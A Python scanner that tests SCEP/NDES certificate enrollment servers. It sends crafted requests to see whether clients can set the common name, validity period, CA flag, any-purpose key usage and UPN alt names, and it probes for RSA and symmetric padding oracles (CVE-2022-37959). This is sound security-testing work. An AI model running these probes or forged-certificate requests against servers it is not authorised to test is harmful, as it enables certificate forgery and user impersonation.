#!/usr/bin/env python3

from requests import get
from urllib.parse import quote
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, DES3
from asn1crypto import cms, algos, x509, core, pem, csr, keys
from oscrypto import asymmetric, keys as oskeys
from hashlib import sha512
import time
from os import urandom
from datetime import datetime, timedelta
from dateutil import tz
import xml.etree.ElementTree as ET
import binascii
import argparse

VALIDCERTS = False
if not VALIDCERTS:
  import urllib3
  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

clientkey = RSA.generate(2048) 
askey = oskeys.parse_private(clientkey.exportKey())
askey = asymmetric.load_private_key(askey)

class Api():
  @staticmethod
  def capsrequest():
    r = get(url, params={ 'operation': 'GetCACaps', 'message': 'CA' }, verify=VALIDCERTS)
    return r

  @staticmethod
  def carequest():
    r = get(url, params={ 'operation': 'GetCACert', 'message': 'CA' }, verify=VALIDCERTS)
    return r

  @staticmethod
  def certrequest(pay:bytes):
    r = get(url, params={ 'operation': 'PKIOperation', 'message': pay.decode() }, verify=VALIDCERTS)
    return r

  @staticmethod
  def getcaps():
    return Api.capsrequest().content

  @staticmethod
  def getcert(pay:bytes):
    r = Api.certrequest(pay)
    if r.headers['Content-Type'] == 'application/x-pki-message':
      return decryptcert(r.content)

  @staticmethod
  def getca():
    def torecipient(tbs):
      key = tbs['subject_public_key_info']['public_key'].parsed
      name = tbs['subject']
      serial = tbs['serial_number']
      return Recipient(name, serial, (key['modulus'].native, key['public_exponent'].native), isca(tbs['extensions']))

    r = Api.carequest()

    if r.headers['Content-Type'] == 'application/x-x509-ca-ra-cert':
      certs = cms.ContentInfo.load(r.content)['content']['certificates']
      return [ torecipient(cert.chosen['tbs_certificate']) for cert in certs ]
    elif r.headers['Content-Type'] == 'application/x-x509-ca-cert':
      tbs = x509.Certificate.load(r.content)['tbs_certificate']
      return [ torecipient(tbs) ]

class CSR():
  def __init__(self, commonname, validityyears, password, attrs):
    self.commonname = commonname
    self.validityyears = validityyears
    self.password = password
    self.attrs = attrs

  def toasn(self):
    req = csr.CertificationRequest({
      'signature_algorithm': {
        'algorithm': 'sha512_rsa'
      },
      'certification_request_info': {
        'version': 0,
        'subject': x509.Name.build({ 'common_name': self.commonname }),
        'subject_pk_info': {
          'algorithm': { 'algorithm': 'rsa' },
          'public_key': { 'modulus': clientkey.n, 'public_exponent': clientkey.e }
        },
        'attributes': [{
          'type': 'challenge_password',
          'values': [ x509.DirectoryString(name='printable_string', value=self.password) ]
        },
        {
          'type': 'enrolment_name_value_pair',
          'values': [
            {'name': 'ValidityPeriod', 'value': 'Years'}
          ]
        },
        {
          'type': 'enrolment_name_value_pair',
          'values': [
            {'name': 'ValidityPeriodUnits', 'value': str(self.validityyears)}
          ]
        },
        {
          'type': 'extension_request',
          'values': [ self.attrs ]
        }]
      }
    })

    req['signature'] = asymmetric.rsa_pkcs1v15_sign(askey, req['certification_request_info'].dump(force=True), 'sha512')
    return req

class EntrepriseOidRootInner(core.Sequence):
  _fields = [
    ('name', cms.SetOfAny, {'implicit': 0})
  ]

class EntrepriseOidRoot(core.Sequence):
  _fields = [
    ('inner', EntrepriseOidRootInner, {'implicit': 0})
  ]

class IdentifiedName(core.Sequence):
  _fields = [
    ('id', core.ObjectIdentifier),
    ('name', cms.SetOfAny, {'implicit': 0})
  ]

class AltName(core.Sequence):
  _fields = [
    ('hex', core.OctetString, {'implicit': 1}),
    ('idname', IdentifiedName, {'implicit': 0})
  ]

# add support for oid 1.3.6.1.4.1.311.13.2.1 in csrs
class EnrolmentNameValuePair(core.Sequence):
  _fields = [
    ('name', core.BMPString),
    ('value', core.BMPString)
  ]

class SetOfEnrolmentNameValuePair(core.SetOf):
  _child_spec = EnrolmentNameValuePair

csr.CSRAttributeType._map['1.3.6.1.4.1.311.13.2.1'] = 'enrolment_name_value_pair'
csr.CRIAttribute._oid_specs['enrolment_name_value_pair'] = SetOfEnrolmentNameValuePair

class EnvelopedData():
  def __init__(self, recipient, data):
    self.recipient = recipient
    self.data = data

  def toasn(self, enckey=None):
    pad = lambda s: s + (8 - len(s)%8)*bytes([8 - len(s)%8])
    iv = b'\x00'*8
    deskey = b'A'*8 + b'\x00'*8 + b'\x7f'*8
    des = DES3.new(deskey, DES3.MODE_CBC, iv)
    rsakey = RSA.construct(self.recipient.keyparams)
    rsa = PKCS1_v1_5.new(rsakey)

    env = cms.EnvelopedData({
      'version': 0,
      'recipient_infos': [
        cms.RecipientInfo(name='ktri', value={
          'version': 0,
          'rid': cms.RecipientIdentifier(name='issuer_and_serial_number', value={
            'issuer': self.recipient.name,
            'serial_number': self.recipient.serial
          }),
          'key_encryption_algorithm': { 'algorithm': 'rsa' },
          'encrypted_key': rsa.encrypt(deskey) if enckey is None else enckey
        })
      ],
      'encrypted_content_info': {
        'content_type': 'data',
        'content_encryption_algorithm': {
          'algorithm': 'tripledes_3key',
          'parameters': iv
        },
        'encrypted_content': des.encrypt(pad(self.data))
      }
    })

    return cms.ContentInfo({
      'content_type': 'enveloped_data',
      'content': env
    })

class SignedData():
  def __init__(self, data):
    self.data = data

  def toasn(self):
    sign = cms.SignedData({
      'version': 1,
      'digest_algorithms': [
        { 'algorithm': 'sha512'}
      ],
      'encap_content_info': {
        'content_type': 'data',
        'content': self.data
      },
      'certificates': [
        cms.CertificateChoices(name='certificate', value={
          'tbs_certificate': {
            'version': 2,
            'serial_number': 1,
            'signature': { 'algorithm': 'sha512_rsa' },
            'issuer': x509.Name.build({ 'common_name': 'pointless' }),
            'validity': {
              'not_before': core.UTCTime(datetime.now(tz=tz.UTC)),
              'not_after': core.UTCTime(datetime.now(tz=tz.UTC) + timedelta(days=1))
            },
            'subject': x509.Name.build({ 'common_name': 'pointless' }),
            'subject_public_key_info': {
              'algorithm': { 'algorithm': 'rsa' },
              'public_key': { 'modulus': clientkey.n, 'public_exponent': clientkey.e }
            }
          },
          'signature_algorithm': { 'algorithm': 'sha512_rsa' },
          'signature_value': b''
        })
      ]
    })

    sign['signer_infos'] = cms.SignerInfos([{
      'version': 1,
      'sid': cms.SignerIdentifier(name='issuer_and_serial_number', value={
        'issuer': x509.Name.build({ 'common_name': 'pointless' }),
        'serial_number': 1
      }),
      'digest_algorithm': { 'algorithm': 'sha512' },
      'signed_attrs': [{
        'type': '2.16.840.1.113733.1.9.2', # messageType
        'values': cms.SetOfAny([ core.PrintableString('19') ])
      },
      {
        'type': 'content_type',
        'values': [ 'data' ]
      },
      {
        'type': 'signing_time',
        'values': [ core.UTCTime(datetime.now(tz=tz.UTC)) ]
      },
      {
        'type': '2.16.840.1.113733.1.9.5', # senderNonce
        'values': cms.SetOfAny([ core.OctetString(urandom(16)) ])
      },
      {
        'type': '2.16.840.1.113733.1.9.7', # transID
        'values': cms.SetOfAny([ core.PrintableString(urandom(20).hex().upper()) ])
      },
      {
        'type': 'message_digest',
        'values': [ sha512(sign['encap_content_info']['content'].contents).digest() ]
      }],
      'signature_algorithm': { 'algorithm': 'sha512_rsa' },
      'signature': b''
    }])

    # servers dont seem to validate the self signed certificates signature, set it anyway
    sign['certificates'][0].chosen['signature_value'] = asymmetric.rsa_pkcs1v15_sign(askey, sign['certificates'][0].chosen['tbs_certificate'].dump(force=True), 'sha512')
    # black magic where we need to sign attributes as set instead of setof (\x31 instead of \xA0)
    sign['signer_infos'][0]['signature'] = asymmetric.rsa_pkcs1v15_sign(askey, b'\x31' + sign['signer_infos'][0]['signed_attrs'].dump(force=True)[1:], 'sha512')
    return cms.ContentInfo({
      'content_type': 'signed_data',
      'content': sign
    })

class Recipient():
  def __init__(self, name, serial, keyparams, isca):
    self.name = name
    self.serial = serial
    self.keyparams = keyparams
    self.isca = isca

def extensionbyoid(oid, cert):
  return [ ext for ext in cert['tbs_certificate']['extensions'] if str(ext['extn_id']) == oid ]

def hasfailinfo(signeddata):
  attroids = [ str(attr['type'])  for attr in signeddata['signer_infos'][0]['signed_attrs'] ]
  return '2.16.840.1.113733.1.9.4' in attroids # check for failinfo oid

def enrollstatement(signeddata):
  ext = [ attr['values'][0].native  for attr in signeddata['signer_infos'][0]['signed_attrs'] if str(attr['type']) == '1.3.6.1.4.1.311.21.33' ]
  return ext[0]

def isca(extensions):
  basicconstraints = [ ext['extn_value'] for ext in extensions if ext['extn_id'].native == 'basic_constraints' ]
  return len(basicconstraints) > 0 and basicconstraints[0].native['ca']

def decryptcert(signed):
  signeddata = cms.ContentInfo.load(signed)['content']
  if hasfailinfo(signeddata):
    return None

  envdata = signeddata['encap_content_info']['content'].native
  env = cms.ContentInfo.load(envdata)['content']
  enckey = env['recipient_infos'][0].chosen['encrypted_key'].native

  algooid = str(env['encrypted_content_info']['content_encryption_algorithm']['algorithm'])
  if algooid != '1.2.840.113549.3.7':
    raise NotImplementedError(f'Only 3DES cbc is supported, server used {algooid}')

  rsa = PKCS1_v1_5.new(clientkey)
  key = rsa.decrypt(enckey, 0)
  iv = env['encrypted_content_info']['content_encryption_algorithm']['parameters'].native
  enccert = env['encrypted_content_info']['encrypted_content'].native
  des = DES3.new(key, DES3.MODE_CBC, iv)
  cert = des.decrypt(enccert)
  return cms.ContentInfo.load(cert)['content']['certificates'][0].chosen

class TestSuite():
  def __init__(self, commonname, password):
    self.password = password
    self.commonname = commonname
    self.validityyears = 2
    self.recipient = None
    self.recipients = []
    self.requiredattr = []

  def buildpay(self, recipient=None, commonname=None, validityyears=None, password=None, attrs=[]):
    certrequest = CSR(self.commonname if commonname is None else commonname,
                      self.validityyears if validityyears is None else validityyears,
                      self.password if password is None else password,
                      attrs + self.requiredattr).toasn().dump(force=True)
    env = EnvelopedData(self.recipient if recipient is None else recipient, certrequest).toasn().dump(force=True)
    return SignedData(env).toasn().dump(force=True)

  def request(self, recipient=None, commonname=None, validityyears=None, password=None, attrs=[]):
    pay = self.buildpay(recipient, commonname, validityyears, password, attrs)
    return Api.getcert(b64encode(pay))

  def testattrs(self):
    attrs = [
      (
        'basic constraints',
        '2.5.29.19',
        x509.BasicConstraints({
          'ca': True,
          'path_len_constraint': 1337
        }).dump(force=True)
      ),
      (
        'extended key usage',
        '2.5.29.37',
        x509.ExtKeyUsageSyntax([ '2.5.29.37.0' ]).dump(force=True)
      ),
      (
        'key usage',
        '2.5.29.15',
        x509.KeyUsage((1,0,1,0,1,0,1))
      ),
      (
        'subject alt name',
        '2.5.29.17', # altname has unconventional format, cant use the one from ans1crypto.x509
        AltName({
          'hex': '1234'.encode(),
          'idname': {
            'id': '1.3.6.1.4.1.311.20.2.3', # universalPrincipalName
            'name': [ core.UTF8String('1234') ]
          }
        })
      )

      # EntrepriseOidRoot?, requested by intune but not added to the certificate
      #(
      #  '1.3.6.1.4.1.311.21.8',
      #  EntrepriseOidRoot({
      #    'inner': EntrepriseOidRootInner({ 'name': [ core.UTF8String('UtilisateurNDES') ] })
      #  })
      #)
    ]

    print('Requesting various certificate attributes')
    for name, oid, value in attrs:
      rejected = False
      usercontrolled = False
      print('-'*20)
      print(name)
      cert = self.request(attrs=[ { 'extn_id': oid, 'critical': True, 'extn_value': value } ])
      defaultext = extensionbyoid(oid, self.defaultcert)
      if len(defaultext) > 0:
        print(f'set by default to {defaultext[0].native}')
      if cert is None:
        rejected = True
        print('request rejected')
        continue
      ext = extensionbyoid(oid, cert)
      if len(ext) > 0 and ext[0]['extn_value'].contents == value:
        usercontrolled = True
        print('user controlled')
      if not rejected and not usercontrolled:
        print('request ignored')
    print('-'*20)

  def testcommonname(self):
    cert = self.request(commonname='1234')
    if cert is not None and cert['tbs_certificate']['subject'].chosen[0][0]['value'].native == '1234':
      print('common name is user controlled')

  def testduration(self):
    cert = self.request(validityyears=1234)
    if cert is not None:
      start = cert['tbs_certificate']['validity']['not_before'].native.year
      end = cert['tbs_certificate']['validity']['not_after'].native.year
      if end-start == 1234:
        print('cert duration is user controlled')

  def testoracle(self):
    # valid sym key enrollstatement: -2146881269 failinfo: 2
    # invalid length, well padded -2146893815 1
    # valid length, well padded -2146893819 1
    # invalid -2146893819 1
    #
    # there is a bleichenbacher oracle on the envelopeddata
    # of MS NetworkDeviceEnrollmentService
    for recipient in self.recipients:
      #if not recipient.isca:
      #  continue

      rsa = RSA.construct(recipient.keyparams)
      rsa = PKCS1_v1_5.new(rsa)
      k = len(rsa.encrypt(b'A'))
      wellformed = rsa.encrypt(b'C'*(k//2))
      env = EnvelopedData(recipient, b'A'*200).toasn(enckey=wellformed).dump(force=True)
      sign = SignedData(env).toasn().dump(force=True)
      r1 = Api.certrequest(b64encode(sign))
      if r1.status_code == 200:
        signed = cms.ContentInfo.load(r1.content)['content']
        v1 = enrollstatement(signed)
      else:
        v1 = None

      illformed = bytes.fromhex(hex(pow(1234, recipient.keyparams[1], recipient.keyparams[0]))[2:].zfill(2*k))
      env = EnvelopedData(recipient, b'A'*200).toasn(enckey=illformed).dump(force=True)
      sign = SignedData(env).toasn().dump(force=True)
      r2 = Api.certrequest(b64encode(sign))
      if r2.status_code == 200:
        signed = cms.ContentInfo.load(r2.content)['content']
        v2 = enrollstatement(signed)
      else:
        v2 = None

      success = v1 is not None and v2 is not None
      if (success and v1 != v2) or (not success and r1.content != r2.content):
        print('asymmetric padding oracle detected [CVE-2022-37959]')
        break

  def testsymoracle(self):
    try:
      ans = set()
      for test in range(0, 256):
        xml = b64decode(self.password.encode())
        root = ET.fromstring(xml)
        data = root.find('Data')
        if data is None:
          return
        chall = data.find('CertEnrollChallenge')
        if chall is None:
          return
        ci = cms.ContentInfo.load(b64decode(chall.text.encode()))
        ec = ci['content']['encrypted_content_info']
        enc = ec['encrypted_content'].native
        ec['encrypted_content'] = enc[:-1] + bytes([test])
        chall.text = b64encode(ci.dump(force=True)).decode()
        password = b64encode(ET.tostring(root)).decode()
        pay = self.buildpay(password=password)
        r = Api.certrequest(b64encode(pay))
        signed = cms.ContentInfo.load(r.content)['content']
        if hasfailinfo(signed):
          ans |= { enrollstatement(signed) }

      if len(ans) > 1:
        print('decryptable challenge password')
    except (ET.ParseError, binascii.Error):
      # this test does not apply for scep servers that
      # use a shared secret as challengepassword
      pass

  def test(self):
    def tryrequiredattr(recipient):
      # some servers require this attribute request
      #knownrequiredattrs = [[{
      #  'extn_id': '2.5.29.15',
      #  'critical': True,
      #  'extn_value': x509.KeyUsage((1,))
      #}]]
      for attr in [[]]:# + knownrequiredattrs:
        cert = self.request(recipient, attrs=attr)
        if cert is not None:
          self.requiredattr = attr
          return cert

    self.recipients = Api.getca()
    if self.recipients is None:
      print('GetCACert failed')
      return

    for recipient in self.recipients:
      self.defaultcert = tryrequiredattr(recipient)
      self.recipient = recipient
      if self.defaultcert is not None:
        break
    if self.defaultcert is None:
      print('failed to acquire certificate, invalid username/password?')
    else:
      self.testcommonname()
      self.testduration()
      self.testattrs()
      # self.testsymoracle()

    # add here tests that do not require a default cert
    self.testoracle()

if __name__ == '__main__':
  parser = argparse.ArgumentParser()
  parser.add_argument("url", help="full url [https://domain.com/scep]")
  parser.add_argument("username", help="username, will become the client cert common name [ABC1234]")
  parser.add_argument("-p","--password", help="password/challengepassword, is a base64 blob with NDES", default="")
  args = parser.parse_args()

  url = args.url
  suite = TestSuite(args.username, args.password)
  suite.test()
